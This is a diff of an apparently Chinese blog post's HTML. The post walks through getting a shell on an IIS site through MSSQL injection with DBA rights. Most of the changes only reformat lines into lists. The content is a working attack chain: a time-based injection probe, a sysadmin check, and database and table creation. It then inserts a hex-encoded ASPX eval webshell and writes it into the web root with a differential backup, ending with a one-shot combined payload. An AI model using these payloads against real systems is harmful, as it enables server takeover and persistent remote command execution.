@@ -25,7 +25,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;8.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;9.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;10.png">
-<meta property="og:updated_time" content="2019-12-13T02:57:12.193Z">
+<meta property="og:updated_time" content="2020-02-10T03:28:55.844Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell&#x2F;1.png">
   
@@ -196,21 +196,29 @@
 
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/1.png" alt="img"></p>
 <p>判断注入点 id=1后面 </p>
-<p>id=1’;WAITFOR DELAY ‘0:0:5’–</p>
+<ul>
+<li>id=1’;WAITFOR DELAY ‘0:0:5’–</li>
+</ul>
 <p>repeater发包需要url编码</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/2.png" alt="img"></p>
 <p>权限判断</p>
-<p>id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 WAITFOR DELAY ‘0:0:5’–</p>
+<ul>
+<li>id=1’;if ( select IS_SRVROLEMEMBER(‘sysadmin’))=1 WAITFOR DELAY ‘0:0:5’–</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/3.png" alt="img"></p>
 <p>延时5秒以上 说明是dba权限</p>
 <p>使用差异备份将一句话木马写入数据库</p>
 <p>首先</p>
-<p>id=1’;create database test1 –</p>
-<p>create database test1  #创建一个名为test1的数据库</p>
+<ul>
+<li>id=1’;create database test1 –</li>
+<li>create database test1  #创建一个名为test1的数据库</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/4.png" alt="img"></p>
 <p>再test1数据库里创建一张表</p>
-<p>id=1’;create table test1.dbo.cmd(cmd varchar(1000)) –</p>
-<p>create table test1.dbo.cmd(cmd varchar(1000))   #创表</p>
+<ul>
+<li>id=1’;create table test1.dbo.cmd(cmd varchar(1000)) –</li>
+<li>create table test1.dbo.cmd(cmd varchar(1000))   #创表</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/5.png" alt="img"></p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/6.png" alt="img"></p>
 <p>成功创建库和表</p>
@@ -218,21 +226,33 @@
 <p>本站中间件为IIS 所以尝试使用IIS默认安装路径 C:\inetpub\wwwroot\</p>
 <p>完整备份 </p>
 <p>执行</p>
-<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’ –</p>
-<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’   #完整备份</p>
+<ul>
+<li><p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’ –</p>
+</li>
+<li><p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’   #完整备份</p>
+</li>
+</ul>
 <p>在建立的表里插入十六进制编码的一句话木马</p>
 <p>id=1’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E) –</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/7.png" alt="img"></p>
-<p>insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E)  #插入一句话</p>
+<ul>
+<li>insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E)  #插入一句话</li>
+</ul>
 <p>最后使用差异备份将木马写入数据库内</p>
-<p>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
+<ul>
+<li>id=1’;Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/8.png" alt="img"></p>
 <p>查看写入情况</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/9.png" alt="img"></p>
-<p>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential  #差异备份</p>
+<ul>
+<li>Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential  #差异备份</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssqlDBA%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/10.png" alt="img"></p>
 <p>完成后去连接一句话木马</p>
-<p>‘;create table test1.dbo.cmd(cmd varchar(1000));Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E);Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</p>
+<ul>
+<li>‘;create table test1.dbo.cmd(cmd varchar(1000));Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.zip’;insert into test1.dbo.cmd VALUES(0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B2267225D2C22756E7361666522293B253E);Backup Database test1 To disk=’C:\inetpub\wwwroot\test1.aspx’ with differential –</li>
+</ul>
 <p>可以一次性执行</p>
 
       
